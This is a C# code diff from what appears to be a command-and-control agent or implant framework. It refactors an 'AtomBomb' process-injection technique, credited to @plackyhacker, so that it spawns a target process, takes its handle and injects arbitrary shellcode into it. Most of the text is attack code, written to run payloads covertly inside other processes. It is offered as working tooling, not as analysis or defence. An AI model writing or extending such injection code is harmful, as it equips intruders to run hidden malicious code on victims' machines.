@@ -1,11 +1,8 @@
-﻿using System;
-using System.Collections.Generic;
+﻿using Agent.Interfaces;
+using Agent.Models;
+using Microsoft.Win32.SafeHandles;
 using System.Diagnostics;
-using System.Linq;
-using System.Reflection.Metadata.Ecma335;
 using System.Runtime.InteropServices;
-using System.Text;
-using System.Threading.Tasks;
 
 namespace Agent
 {
@@ -13,7 +10,7 @@ namespace Agent
     //Credit: @plackyhacker
     public class AtomBomb : ITechnique
     {
-        int ITechnique.id => 3;
+        int ITechnique.id => 99;
 
         public bool resolved { get; set; }
 
@@ -29,29 +26,20 @@ namespace Agent
             { "nqat", "67D69EC328C646633596BF39046FE76D" },
             { "nqua", "6F98ACAE82A620484CEE2E63A19DF0BC" },
         };
-
-        bool ITechnique.Inject(byte[] shellcode, nint hTarget)
+        async Task<bool> ITechnique.Inject(ISpawner spawner, SpawnOptions spawnOptions, byte[] shellcode)
         {
-            try
-            {
-                Process proc = Process.GetProcessById(Native.GetProcessId(hTarget));
-                if (proc is null || proc.Id == 0)
-                {
-                    return false;
-                }
-
-                return Run(proc, shellcode);
-            }
-            catch
+            if(!await spawner.Spawn(spawnOptions))
             {
                 return false;
             }
-        }
-
-        bool ITechnique.Inject(byte[] shellcode, Process proc)
-        {
+            SafeProcessHandle hProc;
+            if (!spawner.TryGetHandle(spawnOptions.task_id, out hProc)){
+                return false;
+            }
+            Process proc = Process.GetProcessById(Native.GetProcessId(hProc.DangerousGetHandle()));
             return Run(proc, shellcode);
         }
+
         public bool Run(Process target, byte[] shellcode)
         {
             ProcessThread thread = GetThread(target.Threads);
